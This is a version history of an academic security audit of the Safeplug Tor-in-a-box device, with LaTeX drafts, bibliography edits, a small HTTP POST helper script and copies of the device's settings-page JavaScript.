### 2014-01-02 report.tex
files for our paper

\documentclass[12pt, letterpaper]{article}

\title{Security Audit of Safeplug}
\author{Annie Edmundson and Anna Kornfeld Simpson}

\begin{document}

\maketitle

\input{bibliography}

\end{document}

### 2014-01-08 bibliography.tex
added bib items

\begin{thebibliography}{99}

\bibitem{safeplug} Safeplug, \url{https://pogoplug.com/safeplug}.

\bibitem{wired} Safeplug makes it super-easy to harness Tor's anonymity at home, \url{http://www.wired.co.uk/news/archive/2013-11/22/safeplug-tor}.

\bibitem{bittech} Pogoplug launches Tor-powered Safeplug, \url{http://www.bit-tech.net/news/hardware/2013/11/25/pogoplug-safeplug/1}.

\bibitem{schneier} Schneier on Security: Tor Appliance.  \url{https://www.schneier.com/blog/archives/2013/11/tor_appliance.html}.

\bibitem{gigaom} Say hello to Safeplug, Pogoplug’s \$49 Tor-in-a-box for anonymous surfing, \url{http://gigaom.com/2013/11/21/say-hello-to-safeplug-pogoplugs-49-tor-in-a-box-for-anonymous-surfing/}.

\bibitem{techreview} Online Anonymity in a Box, for \$49, \url{http://www.technologyreview.com/news/521676/online-anonymity-in-a-box-for-49/}.

\bibitem{wireshark} Wireshark, \url{http://www.wireshark.org/}.

\end{thebibliography}

### 2014-01-08 report.tex
added some sections, but not complete
added more sections
added bib items
added info from our proposal

@@
 \documentclass[12pt, letterpaper]{article}
+\usepackage{url}
 
@@
 
+\section{Introduction}
+
+\section{Background}
+Safeplug is a product that launched last week from the cloud storage company Pogoplug, offering to let users browse the web with “complete security and anonymity” for the cheap price of \$49 \cite{safeplug}.
+Safeplug offers Tor out of the box, with no additional software installation, by sitting between a user’s router and the internet \cite{wired}.
+Pogoplug’s marketing pitch centers around the protection of user’s IP addresses by using Tor \cite{safeplug,bittech}.
+Lots of folks are excited about the idea, but waiting to see a security audit, including Bruce Schneier \cite{schneier}.
+Gigaom quotes Pogoplug CEO Dan Putterman as saying the box uses “vetted software” \cite{gigaom} but who knows what that means?
+
+\section{Goals}
+In this project, we would like to do a security audit of the Safeplug and investigate the following questions.
+How does the box pick which relay node on the Tor network to connect to?
+What kind of authentication goes on between the box and the Tor node?
+Does it use the same route of Tor relays every time?
+Safeplug claims to offer in-box ad-blocking.  How does this work and does it remove any functionality?  Is there an easy way to whitelist things without turning Safeplug off entirely?
+
+What are the configurations on the box?
+Is it clear to users what information is being hidden and what information is being leaked?
+The website talks a lot about IP addresses and warns users to clear cookies \cite{safeplug}, but is that sufficient to preserve anonymization across all web traffic (including Flash or Javascript supercookies that might not be cleared when cookies are cleared)?
+Can user anonymity be leaked by a user’s behavior while still using the Safeplug?
+What else must a user do in addition to using the Safeplug to further preserve anonymity?
+
+Safeplug can act as a relay in the Tor network \cite{techreview}; how would widespread use of the box affect the Tor network?
+
+\section{Methodology}
+Safeplug is not open source, which makes a security audit much more challenging.
+This leads to a debate on where a user will put his/her trust.
+Despite not having the source code, we hope to get a Safeplug, set it up via their website, and use Wireshark to capture traffic and see what happens.
+Wireshark allows us to capture and analyze network data \cite{wireshark}.
+We are interested both in the communication between the clients and the Safeplug and between the Safeplug and the outside world.
+
+\section{Results}
+
+\section{Conclusion}
+
 \input{bibliography}

### 2014-01-09 bibliography.tex
Marvell SoC link
added photos and bibitem

@@
 \begin{thebibliography}{99}
+
+\bibitem{marvellhw} Marvell, ``88F6190 and 88F6192 Integrated Controller Hardware Specifications'' 2 December 2008.
+\url{http://www.marvell.com//embedded-processors/kirkwood/assets/HW_88F619x_OpenSource.pdf}
+
+\bibitem{marvell} Marvell, ``Marvell 88F6192 SoC with Sheeva Technology'' 2009. \url{http://www.marvell.com//embedded-processors/kirkwood/assets/88F6192-003_ver1.pdf}
+
+\bibitem{marvell2} Marvell, ``Marvell Alaska 88E1116R'' 2007. \url{http://www.marvell.com/transceivers/assets/Marvell-Alaska-88E1116R-Single-Port-GbE.pdf}
 

### 2014-01-13 report.tex
updated report
edited report
added outline and python script

@@
 \section{Introduction}
+    -Motivation
+    -Tor
+    -Safeplug
 
@@
 
-\section{Methodology}
+\section{Procedure}
 Safeplug is not open source, which makes a security audit much more challenging.
@@
 
+\subsection{User Experience}
+    -Terms of Service
+    -Setup to home router
+    -Using the internet
+    -Experience
+    -Cookie experience (Fourthparty)
+
+\subsection{Teardown}
+    -Parts in the box
+    -Possible attacks via USB/SD Card
+
+\subsection{Traffic Analysis}
+    -What's the udpate?
+    -Phone home frequency
+    -Does it do anything else?
+    -How does the ad-blocking work?
+
+\subsection{Gaining Access through SSH}
+    -How we got access
+    -What's the software
+    -What/where are the settings
+    -RPC server
+        -Attacks from anyone on local network
+        -Attack from a website?
+
+\subsection{Comparison with Tor Browser Bundle}
+
+\section{Related Work}
+TODO: Annie
+
+\subsection{Tor}
+TODO: Annie
+
+\subsection{Fingerprinting}
+TODO: Annie
+
+\subsection{Third-party and Supercookies}
+TODO: Annie
+
 \section{Conclusion}

### 2014-01-13 send_post_request_script.py

@@ -1,0 +1,12 @@
+import httplib
+import urllib
+
+#params = urllib.urlencode({'@number': 12524, '@type': 'issue', '@action': 'show'})
+headers = {"Content-type": "application/x-www-form-urlencoded",
+            "Accept": "text/plain"}
+conn = httplib.HTTPConnection("bugs.python.org") # put IP address here
+#conn.request("POST", "", params, headers)
+conn.request("POST", "", "", headers)
+response = conn.getresponse()
+data = response.read()
+conn.close()

### 2014-01-13 goals.tex
modified the paper to include sections

--- 2014-01-02 report.tex
@@
-\documentclass[12pt, letterpaper]{article}
+\section{Goals}
+\label{sec:goals}
+TODO: Annie
+In this project, we would like to do a security audit of the Safeplug and investigate the following questions.
+How does the box pick which relay node on the Tor network to connect to?
+What kind of authentication goes on between the box and the Tor node?
+Does it use the same route of Tor relays every time?
+Safeplug claims to offer in-box ad-blocking.  How does this work and does it remove any functionality?  Is there an easy way to whitelist things without turning Safeplug off entirely?
 
-\title{Security Audit of Safeplug}
-\author{Annie Edmundson and Anna Kornfeld Simpson}
+What are the configurations on the box?
+Is it clear to users what information is being hidden and what information is being leaked?
+The website talks a lot about IP addresses and warns users to clear cookies \cite{safeplug}, but is that sufficient to preserve anonymization across all web traffic (including Flash or Javascript supercookies that might not be cleared when cookies are cleared)?
+Can user anonymity be leaked by a user’s behavior while still using the Safeplug?
+What else must a user do in addition to using the Safeplug to further preserve anonymity?
 
-\begin{document}
-
-\maketitle
-
-\input{bibliography}
-
-\end{document}
+Safeplug can act as a relay in the Tor network \cite{techreview}; how would widespread use of the box affect the Tor network?

### 2014-01-13 intro.tex
modified the paper to include sections

--- 2014-01-02 report.tex
@@
-\documentclass[12pt, letterpaper]{article}
-
-\title{Security Audit of Safeplug}
-\author{Annie Edmundson and Anna Kornfeld Simpson}
-
-\begin{document}
-
-\maketitle
-
-\input{bibliography}
-
-\end{document}
+\section{Introduction}
+\label{sec:intro}
+    -Motivation
+    -Tor
+    -Safeplug
+Safeplug is a product that launched last week from the cloud storage company Pogoplug, offering to let users browse the web with “complete security and anonymity” for the cheap price of \$49 \cite{safeplug}.
+Safeplug offers Tor out of the box, with no additional software installation, by sitting between a user’s router and the internet \cite{wired}.
+Pogoplug’s marketing pitch centers around the protection of user’s IP addresses by using Tor \cite{safeplug,bittech}.
+Lots of folks are excited about the idea, but waiting to see a security audit, including Bruce Schneier \cite{schneier}.
+Gigaom quotes Pogoplug CEO Dan Putterman as saying the box uses “vetted software” \cite{gigaom} but who knows what that means?

### 2014-01-13 procedure.tex
modified the paper to include sections

--- 2014-01-02 report.tex
@@
-\documentclass[12pt, letterpaper]{article}
-
-\title{Security Audit of Safeplug}
-\author{Annie Edmundson and Anna Kornfeld Simpson}
-
-\begin{document}
-
-\maketitle
-
-\input{bibliography}
-
-\end{document}
+\section{Procedure}
+\label{sec:procedure}
+TODO: Anna
+Safeplug is not open source, which makes a security audit much more challenging.
+This leads to a debate on where a user will put his/her trust.
+Despite not having the source code, we hope to get a Safeplug, set it up via their website, and use Wireshark to capture traffic and see what happens.
+Wireshark allows us to capture and analyze network data \cite{wireshark}.
+We are interested both in the communication between the clients and the Safeplug and between the Safeplug and the outside world.

### 2014-01-13 results.tex
modified the paper to include sections

\section{Results}
\label{sec:results}
\subsection{User Experience}
TODO: Annie
    -Terms of Service
    -Setup to home router
    -Using the internet
    -Experience
    -Cookie experience (Fourthparty)

\subsection{Teardown}
TODO: Annie
    -Parts in the box
    -Possible attacks via USB/SD Card

\subsection{Traffic Analysis}
TODO: Anna
    -What's the udpate?
    -Phone home frequency
    -Does it do anything else?
    -How does the ad-blocking work?

\subsection{Gaining Access through SSH}
TODO: Anna
    -How we got access
    -What's the software
    -What/where are the settings
    -RPC server
        -Attacks from anyone on local network
        -Attack from a website?

### 2014-01-14 rootfs/opt/xce/html/browserdetect.js
better margins

@@ -1,0 +1,146 @@
+var BrowserDetect = {
+	init: function () {
+	    if(this.inited)
+	        return;
+		this.inited  = true;
+		this.browser = this.searchString(this.dataBrowser) || "An unknown browser";
+		this.version = this.searchVersion(navigator.userAgent)
+			|| this.searchVersion(navigator.appVersion)
+			|| "an unknown version";
+		this.OS = this.searchString(this.dataOS) || "an unknown OS";
+		this.isMobile = (this.OS == 'ios' || this.OS == 'ios' || this.OS == 'and');
+	},
+	searchString: function (data) {
+		for (var i=0;i<data.length;i++)	{
+			var dataString = data[i].string;
+			var dataProp = data[i].prop;
+			this.versionSearchString = data[i].versionSearch || data[i].identity;
+			if (dataString) {
+				if (dataString.indexOf(data[i].subString) != -1)
+					return data[i].identity;
+			}
+			else if (dataProp)
+				return data[i].identity;
+		}
+	},
+	searchVersion: function (dataString) {
+		var index = dataString.indexOf(this.versionSearchString);
+		if (index == -1) return;
+		return parseFloat(dataString.substring(index+this.versionSearchString.length+1));
+	},
+	dataBrowser: [
+		{
+			string: navigator.userAgent,
+			subString: "Chrome",
+			identity: "chrome"
+		},
+		{ 	string: navigator.userAgent,
+			subString: "OmniWeb",
+			versionSearch: "OmniWeb/",
+			identity: "OmniWeb"
+		},
+		{
+			string: navigator.vendor,
+			subString: "Apple",
+			identity: "safari",
+			versionSearch: "Version"
+		},
+		{
+			prop: window.opera,
+			identity: "Opera",
+			versionSearch: "Version"
+		},
+		{
+			string: navigator.vendor,
+			subString: "iCab",
+			identity: "iCab"
+		},
+		{
+			string: navigator.vendor,
+			subString: "KDE",
+			identity: "Konqueror"
+		},
+		{
+			string: navigator.userAgent,
+			subString: "Firefox",
+			identity: "firefox"
+		},
+		{
+			string: navigator.vendor,
+			subString: "Camino",
+			identity: "Camino"
+		},
+		{		// for newer Netscapes (6+)
+			string: navigator.userAgent,
+			subString: "Netscape",
+			identity: "Netscape"
+		},
+		{
[…]

### 2014-01-14 rootfs/opt/xce/html/safeplug.js

@@ -1,0 +1,423 @@
+var SFPG = new function() 
+{
+    var RPCPFX = '/svc/xspctrl/';
+    var self      = this;
+    var g_filters = [];
+    
+    
+    var $ = this.$ = function(n) {
+        if(typeof(n)=='string') {
+            return document.getElementById(n);
+        } else {
+            return n;
+        }
+    };
+
+    // rac (remove all children)
+    //    remoaves all child nodes from the parent node (e)
+    function rac(e, removeEl) {
+        var el = $(e);
+        if(el) {
+            while(el.hasChildNodes()) {
+                var c = el.firstChild;
+                el.removeChild(c);
+            }
+            if(removeEl && el.parentNode)
+                el.parentNode.removeChild(el);
+        }
+    };
+    // dce (document create element)
+    //     create element of type (t) optionally with id (i) and classname (c)
+    function dce(t,i,c,ch) {
+        var el = document.createElement(t);
+        if(t=='a') el.href='#';
+        if(i) el.id = i;
+        if(c) el.className = c;
+        if(ch) {
+            if(ch.constructor == Array) {
+                for(var i=0;i<ch.length;i++) {
+                    if(ch[i]) {
+                        el.appendChild(ch[i]);
+                    }
+                }
+            } else {
+                el.appendChild(ch);
+            }
+        }
+        return el;
+    };
+    function dcd(c,ch,i) {
+        var el = dce('div',i,c,ch);
+        return el;
+    }
+    function dctn(t) {
+        return document.createTextNode(t);
+    };
+    // --- class name helpers
+    // lCN (list Class Names)
+    //     returns an array of all class names on element (e)
+    function lCN(e) {
+        var cnl = [];
+        var el = $(e);
+        if(el) {
+            if(el.className) {
+                cnl = el.className.split(' ');
+            }
+        }
+        return cnl;
+    };
+    // irCN (if remove Class Name)
+    //      selectively removes class name (cn) from optional class name list (cnl) of element (e)
+    function irCN(e, cn, cnl) {
+        if(cnl === undefined || cnl === null) {
+            cnl = lCN(e);
+        }
+        for(var i=0; i<cnl.length; i++) {
+            if(cnl[i] == cn) {
+                cnl.splice(i, 1);
+                i--;
+            }
+        }
+        return cnl;
+    };
+    // hCN (has Class Name)
+    //     returns true if class name (cn) is on element (e), false otherwise
+    function hCN(e, cn) {
+        var r = false;
[…]

### 2014-01-14 bibliography.tex
paper additions

@@
 
+\bibitem{tor} Dingledine, Roger, Nick Mathewson, and Paul Syverson. Tor: The second-generation onion router. NAVAL RESEARCH LAB WASHINGTON DC, 2004.
+
+\bibitem{tor2} Johnson, Aaron, et al.
+``Users get routed: Traffic correlation on Tor by realistic adversaries.'' Proceedings of the 2013 ACM SIGSAC conference on Computer & communications security.
+ACM, 2013.
+
+\bibitem{fingerprint1} Cai, Xiang, et al.
+"Touching from a distance: Website fingerprinting attacks and defenses." Proceedings of the 2012 ACM conference on Computer and communications security.
+ACM, 2012.
+
+\bibitem{fingerprint2} Kohno, Tadayoshi, Andre Broido, and Kimberly C. Claffy. "Remote physical device fingerprinting." Dependable and Secure Computing, IEEE Transactions on 2.2 (2005): 93-108.
+
+\bibitem{commercial1} Nikiforakis, Nick, et al. "Cookieless monster: Exploring the ecosystem of web-based device fingerprinting." IEEE Symposium on Security and Privacy. 2013.
+
+\bibitem{commercial2} Mayer, Jonathan R., and John C. Mitchell. "Third-party web tracking: Policy and technology." Security and Privacy (SP), 2012 IEEE Symposium on. IEEE, 2012.
+
 \end{thebibliography}

### 2014-01-14 results.tex
paper additions
alphabetized bib

@@
 
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=\linewidth]{safeplug_top}
+\caption{This is a figure.}
+\end{center}
+\end{figure}
+
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=\linewidth]{safeplug_bottom}
+\caption{This is a figure.}
+\end{center}
+\end{figure}
+
 \subsection{Traffic Analysis}
@@
     -How we got access
+    \subsubsection{Accessing the Device}
     -What's the software
+    \subsubsection{Software on the Safeplug}
+Tor, Privoxy, and Lighttpd.
+Lighttpd is an open-source webserver, which is serving the settings page on the device - the project's description mentions ``security, speed, compliance, and flexibility [...
+while being] designed and optimized for high perfomance environments'' \cite{lighttpd}.
+Privoxy is a ``non-caching web proxy with advanced filtering capabilities for enhancing privacy, modifying webpage data and HTTP headers, controlling access, and removnig ads and other obnoxious Internet junk'' and it specifically advertises its ``flexible configuration'' \cite{privoxy}.
     -What/where are the settings

### 2014-01-14 results.tex
split results in half

--- 2014-01-13 results.tex
@@
 \subsection{User Experience}
+\label{sec:ux}
 TODO: Annie
@@
 \subsection{Teardown}
+\label{sec:tear}
 TODO: Annie
@@
 
-\subsection{Traffic Analysis}
-TODO: Anna
-    -What's the udpate?
-    -Phone home frequency
-    -Does it do anything else?
-    -How does the ad-blocking work?
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=\linewidth]{safeplug_top}
+\caption{This is a figure.}
+\end{center}
+\end{figure}
 
-\subsection{Gaining Access through SSH}
-TODO: Anna
-    -How we got access
-    -What's the software
-    -What/where are the settings
-    -RPC server
-        -Attacks from anyone on local network
-        -Attack from a website?
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=\linewidth]{safeplug_bottom}
+\caption{This is a figure.}
+\end{center}
+\end{figure}

### 2014-01-14 resultsSoftware.tex
split results in half

\subsection{Traffic Analysis}
\label{sec:traffic}
TODO: Anna
    -What's the udpate?
    -Phone home frequency
    -Does it do anything else?
    -How does the ad-blocking work?

\subsection{Gaining Access through SSH}
\label{sec:SSH}
TODO: Anna
    -How we got access
    \subsubsection{Accessing the Device}
    -What's the software
    \subsubsection{Software on the Safeplug}
Tor, Privoxy, and Lighttpd.  Lighttpd is an open-source webserver, which is serving the settings page on the device - the project's description mentions ``security, speed, compliance, and flexibility [... while being] designed and optimized for high perfomance environments'' \cite{lighttpd}.  Privoxy is a ``non-caching web proxy with advanced filtering capabilities for enhancing privacy, modifying webpage data and HTTP headers, controlling access, and removnig ads and other obnoxious Internet junk'' and it specifically advertises its ``flexible configuration'' \cite{privoxy}.
    -What/where are the settings
    -RPC server
        -Attacks from anyone on local network
        -Attack from a website?

### 2014-01-14 bibliography.tex
edited goals

@@
 \bibitem{tor2} Johnson, Aaron, et al.
-``Users get routed: Traffic correlation on Tor by realistic adversaries.'' Proceedings of the 2013 ACM SIGSAC conference on Computer & communications security.
+``Users get routed: Traffic correlation on Tor by realistic adversaries.'' Proceedings of the 2013 ACM SIGSAC conference on Computer \& communications security.
 ACM, 2013.

### 2014-01-14 goals.tex
edited goals

@@
 \label{sec:goals}
-TODO: Annie
-In this project, we would like to do a security audit of the Safeplug and investigate the following questions.
-How does the box pick which relay node on the Tor network to connect to?
-What kind of authentication goes on between the box and the Tor node?
-Does it use the same route of Tor relays every time?
-Safeplug claims to offer in-box ad-blocking.  How does this work and does it remove any functionality?  Is there an easy way to whitelist things without turning Safeplug off entirely?
 
-What are the configurations on the box?
-Is it clear to users what information is being hidden and what information is being leaked?
-The website talks a lot about IP addresses and warns users to clear cookies \cite{safeplug}, but is that sufficient to preserve anonymization across all web traffic (including Flash or Javascript supercookies that might not be cleared when cookies are cleared)?
-Can user anonymity be leaked by a user’s behavior while still using the Safeplug?
-What else must a user do in addition to using the Safeplug to further preserve anonymity?
+In this project, we perform a security audit of the Safeplug device.
+As the purpose of Safeplug is to anonymize its users, its use of Tor is central to the design.
+This leads to concern about how Safeplug uses the Tor network; we investigate the following questions about its interaction with Tor.
 
-Safeplug can act as a relay in the Tor network \cite{techreview}; how would widespread use of the box affect the Tor network?
+\begin{itemize}
+\item How does the box pick which relay node on the Tor network to connect to?
+\item What kind of authentication goes on between the box and the Tor node?
+\item Does it use the same route of Tor relays every time?
+\end{itemize}
+
+We are also interested in the configurations and settings involved in using the Safeplug device.
+Studying the following questions help us determine if there are security vulnerabilities related to this part of the device.
+
+\begin{itemize}
+\item What are the configurations on the box?
+\item How do updates affect the configurations?
+\item Safeplug claims to offer in-box ad-blocking; how does this work and does it remove any functionality?
+\item Is there an easy way to whitelist things without turning Safeplug off entirely?
+\end{itemize}
+
+Another important aspect of this device is that it is marketed as a simple and easy solution to anonymization.
+We suspect that the setup might be simple and easy, but will its use be just as good?
+If the device causes any problems while browsing the Internet, then users may opt just to turn the device off.
+This brought up the following questions about the usability of the device.
+
+\begin{itemize}
+\item Is it clear to users what information is being hidden and what information is being leaked?
+\item The website talks a lot about IP addresses and warns users to clear cookies \cite{safeplug}, but is that sufficient to preserve anonymization across all web traffic (including Flash or Javascript supercookies that might not be cleared when cookies are cleared)?
+\item Can user anonymity be leaked by a user’s behavior while still using the Safeplug?
+\item What else must a user do in addition to using the Safeplug to further preserve anonymity?
+\end{itemize}
+
+The Safeplug device can also be configured for use as a Tor relay node.  We raise the following questions about the affects of this option.
+
+\begin{itemize}
+\item How would widespread use of the box affect the Tor network?
+\item How well is the function of a Tor relay node described to users?
+\end{itemize}

### 2014-01-14 bibliography.tex

--- 2014-01-09 bibliography.tex
@@
 \begin{thebibliography}{99}
+
+\bibitem{fingerprint1} Cai, Xiang, et al.
+``Touching from a distance: Website fingerprinting attacks and defenses.'' \emph{Proceedings of the 2012 ACM conference on Computer and Communications Security (CCS)}, 2012.
+
+\bibitem{tor} Dingledine, Roger, et. al. ``Tor: The second-generation onion router.'' \emph{USENIX Security Symposium}, 2004.
+
+\bibitem{bittech} Halfacree, Gareth. ``Pogoplug launches Tor-powered Safeplug'' \emph{bit-tech.net} 25 November 2013, \url{http://www.bit-tech.net/news/hardware/2013/11/25/pogoplug-safeplug/1}.
+
+\bibitem{tor2} Johnson, Aaron, et al.
+``Users get routed: Traffic correlation on Tor by realistic adversaries.'' \emph{Proceedings of the 2013 ACM SIGSAC conference on Computer \& Communications Security (CCS)}, 2013.
+
+\bibitem{fingerprint2} Kohno, Tadayoshi et. al. "Remote physical device fingerprinting." Dependable and Secure Computing, IEEE Transactions on 2.2 (2005): 93-108.
+
+\bibitem{lighttpd} Lighttpd. \url{http://www.lighttpd.net}
 
@@
 
-\bibitem{safeplug} Safeplug, \url{https://pogoplug.com/safeplug}.
+\bibitem{fourthparty} Mayer, Jonathan. ``FourthParty'' \url{http://fourthparty.info}
 
-\bibitem{wired} Safeplug makes it super-easy to harness Tor's anonymity at home, \url{http://www.wired.co.uk/news/archive/2013-11/22/safeplug-tor}.
+\bibitem{commercial2} Mayer, Jonathan R., and John C. Mitchell. "Third-party web tracking: Policy and technology." \emph{IEEE Symposium on Security and Privacy (SP)}, 2012.
 
-\bibitem{bittech} Pogoplug launches Tor-powered Safeplug, \url{http://www.bit-tech.net/news/hardware/2013/11/25/pogoplug-safeplug/1}.
+\bibitem{gigaom} Meyer, David.
+``Say hello to Safeplug, Pogoplug’s \$49 Tor-in-a-box for anonymous surfing'', \emph{GigaOm}, 21 November 2013.
+\url{http://gigaom.com/2013/11/21/say-hello-to-safeplug-pogoplugs-49-tor-in-a-box-for-anonymous-surfing/}.
 
-\bibitem{schneier} Schneier on Security: Tor Appliance.  \url{https://www.schneier.com/blog/archives/2013/11/tor_appliance.html}.
+\bibitem{commercial1} Nikiforakis, Nick, et al. "Cookieless monster: Exploring the ecosystem of web-based device fingerprinting." IEEE Symposium on Security and Privacy. 2013.
 
-\bibitem{gigaom} Say hello to Safeplug, Pogoplug’s \$49 Tor-in-a-box for anonymous surfing, \url{http://gigaom.com/2013/11/21/say-hello-to-safeplug-pogoplugs-49-tor-in-a-box-for-anonymous-surfing/}.
+\bibitem{safeplug} Pogoplug. ``Safeplug'', \url{https://pogoplug.com/safeplug}.
 
-\bibitem{techreview} Online Anonymity in a Box, for \$49, \url{http://www.technologyreview.com/news/521676/online-anonymity-in-a-box-for-49/}.
+\bibitem{privoxy} Privoxy. \url{https://www.privoxy.org}
+
+\bibitem{schneier} Schneier, Bruce. ``Tor Appliance.'' \emph{Schneier on Security}, 27 November 2013. \url{https://www.schneier.com/blog/archives/2013/11/tor_appliance.html}.
+
+\bibitem{techreview} Simonite, Tom.
+``Online Anonymity in a Box, for \$49'', \emph{MIT Technology Review}, 21 November 2013.
+\url{http://www.technologyreview.com/news/521676/online-anonymity-in-a-box-for-49/}.
+
+\bibitem{wired} Solon, Olivia.
+``Safeplug makes it super-easy to harness Tor\'s anonymity at home,'' \emph{Wired UK}, 22 November 2013.
+\url{http://www.wired.co.uk/news/archive/2013-11/22/safeplug-tor}.
 

### 2014-01-14 bibliography.tex
spymall

--- 2014-01-14 bibliography.tex
@@
 \begin{thebibliography}{99}
+
+\bibitem{spymall} Appelbaum et. al. ``Shopping for Spy Gear: Catalog Advertises 
+NSA Toolbox'' \emph{Der Spiegel} 29 December 2013 \url{www.spiegel.de/internatio
+nal/world/catalog-reveals-nsa-has-back-doors-for-numerous-devices-a-940994.html}
 
@@
 
-\bibitem{tor} Dingledine, Roger, Nick Mathewson, and Paul Syverson. Tor: The second-generation onion router. NAVAL RESEARCH LAB WASHINGTON DC, 2004.
-
-\bibitem{tor2} Johnson, Aaron, et al.
-``Users get routed: Traffic correlation on Tor by realistic adversaries.'' Proceedings of the 2013 ACM SIGSAC conference on Computer & communications security.
-ACM, 2013.
-
-\bibitem{fingerprint1} Cai, Xiang, et al.
-"Touching from a distance: Website fingerprinting attacks and defenses." Proceedings of the 2012 ACM conference on Computer and communications security.
-ACM, 2012.
-
-\bibitem{fingerprint2} Kohno, Tadayoshi, Andre Broido, and Kimberly C. Claffy. "Remote physical device fingerprinting." Dependable and Secure Computing, IEEE Transactions on 2.2 (2005): 93-108.
-
-\bibitem{commercial1} Nikiforakis, Nick, et al. "Cookieless monster: Exploring the ecosystem of web-based device fingerprinting." IEEE Symposium on Security and Privacy. 2013.
-
-\bibitem{commercial2} Mayer, Jonathan R., and John C. Mitchell. "Third-party web tracking: Policy and technology." Security and Privacy (SP), 2012 IEEE Symposium on. IEEE, 2012.
-
 \end{thebibliography}

### 2014-01-14 results.tex
added results

@@
 \label{sec:ux}
-TODO: Annie
-    -Terms of Service
-    -Setup to home router
-    -Using the internet
-    -Experience
-    -Cookie experience (Fourthparty)
+
+Before setting up and using the Safeplug device, we read a variety of news articles as well as opinions through the Tor mailing list~\cite{tormailinglist}.
+There were many thoughts on the Terms of Service and the option to use the device as a Tor relay node; this inspired us to start our analysis with these items.
+
+\subsubsection{Terms of Service}
+Safeplug's Terms of Service are interesting because they are controlling, yet the product they are for is a device for anonymization.
+The first section of the Terms of Service explains how to agree to them:
+
+\begin{quotation}
+``You must agree to these TOS before you can use the Service.
+You can agree to these TOS by: a) actually using the Service, or b) clicking a box that indicates you agree to the Service, where such a box is made available to you.'' \cite{safeplug}
+\end{quotation}
+
+This is worth noting because option b) described above did not exist in any part of the setup process for Safeplug.
+The Terms of Service continues by notifying readers that Pogoplug can change them any time they wish:
+
+\begin{quotation}
+``Pogoplug may update or change these TOS from time to time and recommends that you review the TOS on a regular basis at www.pogoplug.com/safeplug.
+You understand and agree that your continued use of the Service after the TOS has changed constitutes your acceptance of the TOS as revised.
+'' \cite{safeplug}
+\end{quotation}
+
+Most Safeplug users will likely not read the Terms of Service once, let alone on a regular basis; therefore, most users will be blind to any changes.
+It is also interesting that these Terms of Service are only accessible through a small link at the bottom of the Safeplug website \cite{safeplug}; specifically, there is no documentation, including the Terms of Service, in the package that the device was shipped in.
+Further along in the Terms of Service, the makers of Safeplug were sloppy when they wrote:
+
+\begin{quotation}
+``Pogoplug includes several open source components in the Software.
+You agree to abide by the terms of the relevant licenses, as may be updated by Pogoplug from time to time at http://pogoplug.com/home-en-developers-open-source.html.
+'' \cite{safeplug}
+\end{quotation}
+
+The link included is a dead link and takes the user to a web page with a 404 error.
+This may indicate that there are other errors related to Safeplug (potential security vulnerabilities).
+The last section of the Terms of Service that stood out described Pogoplug's policy on updates:
+
+\begin{quotation}
+``As part of the Service, you may from time to time receive updates to the Software from Pogoplug that may be automatically downloaded and installed to your applicable device.
+These updates may include bug fixes, security enhancements or improvements, or entirely new versions of the Software.
+You agree that Pogoplug may automatically deliver such updates to you as part of the Service.
+'' \cite{safeplug}
+\end{quotation}
+
+This should raise a red flag for users because they may not know when the software in their device is being changed or what it is changing to.
+While Safeplug makes many claims about providing anonymity, users are simply putting their trust in a different entity, namely Pogoplug.
+
+\subsubsection{Tor Relay Node Option}
+One of Safeplug's configurations is the use of the device as a Tor relay node in the Tor network.  When the device is initially setup, the default setting is to not use it as a relay node.
+
+One of our concerns is how understandable this setting is to the average Internet user.
+The settings page describes Tor in an extremely basic way, as shown in Figure~\ref{fig:funnydesc}, but describes the functionality of a Tor relay node in a much more technical manner.
+This description is shown in Figure~\ref{fig:relaydesc}.
+If the majority of users can only understand the simpler description, then they likely won't understand the description of a Tor relay node.
+This could be a problem if users simply decide not to do anything with that setting (i.e.
+don't change the setting to use Safeplug as a relay node).
+Then there would be a large increase in use of the Tor network, yet most of the users are not giving back to it.
+
+\begin{figure}[htb]
+\label{fig:funnydesc}
+\begin{center}
+\includegraphics[width=\textwidth]{funnydesc}
+\caption{This is a figure.}
+\end{center}
+\end{figure}
+
+\begin{figure}[htb]
+\label{fig:relaydesc}
+\begin{center}
+\includegraphics[width=\textwidth]{relaydesc}
+\caption{This is a figure.}
+\end{center}
+\end{figure}
+
+This could easily be remedied; Safeplug should choose a target audience and have consistent descriptions.
+The best option is to explain the Tor network and the functionality of a Tor relay node at the same level, preferably a level that normal Internet users can understand.
+This increases the chances that users will run their Safeplug as a relay node.
+
+\subsubsection{Internet Use}
+    -Setting it up
+    -Using the internet (show before and after for IP addresses)
+    -Cookie experience First party cookies
 
@@
 \label{sec:tear}
-TODO: Annie
+
+\subsubsection{Components}
     -Parts in the box
-    -Possible attacks via USB/SD Card
 
@@
 \begin{center}
-\includegraphics[width=\linewidth]{safeplug_top}
+\includegraphics[width=0.25\textwidth]{safeplug_top}
 \caption{This is a figure.}
@@
 \begin{center}
-\includegraphics[width=\linewidth]{safeplug_bottom}
+\includegraphics[width=0.25\textwidth]{safeplug_bottom}
 \caption{This is a figure.}
@@
 \end{figure}
+
+\subsubsection{Possible Attacks}
+    -Possible attacks via USB/SD Card

### 2014-01-14 results.tex
compile
merging
added more results

@@
 \begin{figure}[htb]
+\begin{center}
+\includegraphics[width=\textwidth]{funnydesc.png}
+\caption{This is a figure.}
 \label{fig:funnydesc}
-\begin{center}
-\includegraphics[width=\textwidth]{funnydesc}
-\caption{This is a figure.}
 \end{center}
@@
 \begin{figure}[htb]
+\begin{center}
+\includegraphics[width=\textwidth]{relaydesc.png}
+\caption{This is a figure.}
 \label{fig:relaydesc}
-\begin{center}
-\includegraphics[width=\textwidth]{relaydesc}
-\caption{This is a figure.}
 \end{center}
@@
 \subsubsection{Internet Use}
-    -Setting it up
-    -Using the internet (show before and after for IP addresses)
-    -Cookie experience First party cookies
+
+{\bf Setting up Safeplug.} The first step was to plug Safeplug into our router and activate our device.
+Our instructions are shown in Figure~\ref{fig:instructions}.
+We followed them, activated our device, and then ended on the configuration page.
+The configuration page has a combination of platforms and browsers, with a different set of proxy configuration instructions for each one.
+It is interesting to note that the only platform options were: OSX, Windows, Android, and iOS.
+Figure~\ref{fig:proxyconfig} shows our configuration.
+
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=\textwidth]{instructions}
+\caption{This is a figure.}
+\label{fig:instructions}
+\end{center}
+\end{figure}
+
+\begin{figure}[htb]
+\begin{center}
+\includegraphics[width=\textwidth]{proxyconfig}
+\caption{This is a figure.}
